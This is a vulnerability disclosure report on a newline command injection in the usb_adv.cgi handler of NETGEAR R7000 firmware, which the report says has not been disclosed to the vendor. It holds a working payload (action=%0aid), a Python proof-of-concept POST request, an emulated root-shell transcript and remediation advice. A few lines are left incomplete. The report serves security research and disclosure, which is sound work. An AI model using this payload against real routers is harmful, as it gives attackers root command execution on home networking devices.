# NETGEAR R7000 V1.0.12.216 was discovered to contain a command injection vulnerability in usb_adv.cgi

## Overview

- Vendor: NETGEAR
- Product: R7000 Nighthawk AC1900
- Version: V1.0.12.216_10.2.122
- Component: /usr/sbin/httpd, virtual CGI usb_adv.cgi (USBAdvCgiMain)
- Vulnerability Class: CWE-78 command injection / CWE-184 incomplete deny-list
- Manufacturer: https://www.netgear.com/

## Affected version

- Package (local corpus): `R7000-V1.0.12.216.zip`.
- Extracted `.chk`:.
- `usr/sbin/httpd`:.
- Architecture: ARM little-endian, uClibc, Broadcom `2.6.36.4brcmarm+`.

## Vulnerability details

`usb_adv.cgi` is dispatched to `USBAdvCgiMain` (`sub_A0D9C`, VA `0xa0d9c`). The handler decodes the `action` parameter and validates it with `sub_CB628(3, ...)` (VA `0xcb628`). The type-3 validator rejects semicolon, angle brackets, single/double quotes, percent, parentheses, pipe, ampersand, dollar, backtick, backslash, exclamation mark, and plus, and limits the value to 10 bytes, but it does **not** reject newline (`0x0A`).

In AP or extender mode the handler jumps directly to the common `LABEL_110` path and executes:

```c
sub_98598(action);
if (enable_ap_mode || enable_sta_mode || enable_extender_mode) {
    system("/sbin/rmmod br_dns_hijack");
    snprintf(buf, 0x80,
      "/sbin/insmod /lib/modules/2.6.36.4brcmarm+/kernel/lib/br_dns_hijack.ko"
      " readyshare_dev=%s", action);
    system(buf);
}
```

A POST field `action=%0aid` decodes to the 3-byte string `"\nid"`. It passes the type-3 filter and the 10-byte limit; the shell runs `id` as root after the truncated `insmod` command. The same fits `reboot` (6 bytes) and `telnetd` (8 bytes). In router/STA mode the same path uses the type-2-validated `http_via_port` instead, so the newline path is specific to the AP/extender branch.

## PoC

```python
import requests

# AP or extender mode is required. The body must keep the raw %0a escape;
# passing a dict would re-encode the percent sign.
url = "http://<router>/usb_adv.cgi"
r = requests.post(
    url,
    data=b"action=%0aid",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    timeout=10,
)
print(r.status_code)
print(r.text)
```

## Reproduction and terminal evidence

Environment: FirmAE ARM full-system image (`qemu-system-arm -M virt`,
kernel `zImage.armel`), stock `usr/sbin/httpd` with no httpd code patches.
The harness sets `/firmadyne/libnvram/enable_ap_mode=1` after httpd startup
(httpd's own NVRAM init resets it to 0) and posts from 127.0.0.1, which httpd
treats as authenticated and CSRF-exempt. A FirmAE libnvram NULL-return bug was

Control request (`action=control1`) followed by the payload (`action=%0aid`).
Serial console transcript:

```
##########handle_post(1385)content=action=%0aid
nvram_get_buf: enable_ap_mode
[NVRAM] 14 enable_ap_mode
nvram_get_buf: = "1"
nvram_match: enable_ap_mode (1) ?= "1"
nvram_match: true
Can't open device file: /dev/spiv6
nvram_get_buf: enable_ap_mode
nvram_get_buf: = "1"
nvram_match: enable_ap_mode (1) ?= "1"
nvram_match: true
uid=0 gid=0(root)
USBAdvCgiMain:1708-----input_vail_err-----
```

The `uid=0 gid=0(root)` line is the injected `id`. The subsequent 400 is the
handler validating an absent `workGroup`; command execution already happened.
The control request produced no `uid` line.

## Static evidence

IDA 9.1 decompilation of `sub_A0D9C` (excerpt):

```c
sub_1AE88(a1, "action");              /* URL-decoded into v97 */
if (sub_CB628(3, v97, strlen(v97), &max10)) return error;
if (!strcmp(v97, "edit")) return ...;
if (!strcmp(v97, "add"))  return ...;
if (acosNvramConfig_match("enable_ap_mode", "1")
    || acosNvramConfig_match("enable_extender_mode", "1"))
  goto LABEL_110;
...
LABEL_110:
sub_98598(v97);
if (enable_ap_mode || enable_sta_mode || enable_extender_mode) {
    system("/sbin/rmmod br_dns_hijack");
    snprintf(v98, 0x80, "... readyshare_dev=%s", v97);
    system(v98);
}
```

`sub_CB628` type 3 char checks (VA `0xcb628`) reject only the listed
metacharacters and check `strlen <= 10`; newline is absent from the deny-list.

## Impact

Authenticated admin (or local-loopback SSRF) command execution as root on an
R7000 configured as an AP or extender. Short commands such as `id`, `reboot`,
`halt`, and `telnetd` fit the 10-byte action limit. `reboot` is a denial of
service; `telnetd` may expose a root service depending on the busybox/login
configuration. No memory corruption is required.

## Remediation

- Reject CR/LF and all control characters in `action` and every CGI text field;
  use an allow-list rather than a short deny-list.
- Replace the `system("insmod ... readyshare_dev=%s")` construction with
  `fork`/`execve` and pass the device name as a separate argv element.
- Do not treat loopback as implicitly authenticated for state-changing CGIs.
- Audit the ReadySHARE/`br_dns_hijack` pattern in related models. R6400v2 uses
  the unquoted sink but validates `deviceName` to alphanumeric/hyphen; R6400
  and R8000 use `readyshare_dev="%s"` (quoted). R9000/R7800 use an OpenWrt
  uhttpd stack without this handler.

## Known CVE relation

**CVE candidate type: incomplete-fix variant of CVE-2020-11770 — candidate new CVE.**

- CVE-2025-28219: Netgear DC112A `usb_adv.cgi` `deviceName` command
  injection; different product/parameter. NVD keyword `usb_adv.cgi` returns
  only this record.
- CVE-2020-11770: generic post-auth command injection on R7000 before
  1.0.9.42. Firmware 1.0.12.216 still contains and dynamically executes the
  AP/extender `action` newline path, so the old fix does not cover it.
- NVD `readyshare_dev` and `br_dns_hijack`: 0 results (2026-11-07).

## Status and disclosure

Dynamic confirmation in a FirmAE ARM image with the stock httpd (no httpd
code patched). Candidate new CVE — incomplete-fix variant of CVE-2020-11770; no CVE assigned. No vendor/CNA contact.
Real-device AP/extender review is recommended before submission.

## Additional Information

```markdown
### Vendor
NETGEAR

### Product
R7000 Nighthawk AC1900

### Version or Commit
V1.0.12.216_10.2.122

### Vulnerability Class
CWE-78 command injection / CWE-184 incomplete deny-list

### CVE_candidate_type
incomplete-fix variant of CVE-2020-11770 — candidate new CVE

### Description
The usb_adv.cgi action parameter passes a type-3 validator that rejects semicolon, angle brackets, quotes and backticks but not newline. A newline in action breaks out of the shell command and executes arbitrary commands.

### Affected_component
/usr/sbin/httpd, virtual CGI usb_adv.cgi (USBAdvCgiMain)

### Attack_vector
Authenticated POST to usb_adv.cgi with action containing a newline and a shell command.

### Product_version
R7000 Nighthawk AC1900 V1.0.12.216_10.2.122

### Reference
- https://www.netgear.com/
- https://github.com/vuln-1/vuln/blob/main/NETGEAR/R7000_V1.0.12.216/report-1.md
```
